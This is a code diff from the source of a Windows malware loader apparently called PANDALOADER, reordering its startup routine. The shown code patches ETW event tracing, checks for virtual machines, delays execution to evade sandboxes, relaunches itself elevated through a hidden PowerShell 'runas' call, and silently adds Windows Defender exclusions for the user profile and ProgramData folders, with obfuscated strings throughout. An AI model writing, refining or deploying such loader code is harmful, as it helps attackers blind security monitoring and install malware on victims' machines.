@@ -317,21 +317,8 @@ void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     std::string exePath = get_executable_path();
 	std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
-    if (SINGLE_INSTANCE) {
-        HANDLE hMutex = CreateMutex(NULL, TRUE, OBF("PANDALOADER"));
-        if (hMutex != NULL) {
-            CloseHandle(hMutex);
-        }
-    }
-#if ENABLE_ANTIVM
-    if (VMPROTECT()) {
-        ExitProcess(1);
-    }
-#endif
-    if (SLEEP_DELAY) {
-        Sleep(7000);
-    }
-    if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
+	ETWPATCH();
+	if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
         LPCWSTR powershellPath = OBF(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
         WCHAR cmdLine[MAX_PATH];
 #ifdef __MINGW32__
@@ -341,10 +328,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         // Use %s for Visual Studio, which expects a wchar_t* (wide string).
        swprintf(cmdLine, MAX_PATH, OBF(L"Start-Process -FilePath '\"%s\"' -Verb runAs"), exePathW.data());
 #endif
-        ShellExecuteW(NULL, OBF(L"runas"), powershellPath, cmdLine, NULL, SW_HIDE);
+       ShellExecuteW(NULL, OBF(L"runas"), powershellPath, cmdLine, NULL, SW_HIDE);
+       return 0;
+    }
+	if (SINGLE_INSTANCE) {
+        HANDLE hMutex = CreateMutex(NULL, TRUE, OBF("PANDALOADER"));
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        CloseHandle(hMutex);
         return 0;
     }
-	ETWPATCH();
+    }
+#if ENABLE_ANTIVM
+    if (VMPROTECT()) {
+        ExitProcess(1);
+    }
+#endif
+    if (SLEEP_DELAY) {
+        Sleep(7000);
+    }
     if (ADD_EXCLUSION) {
         ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
     }
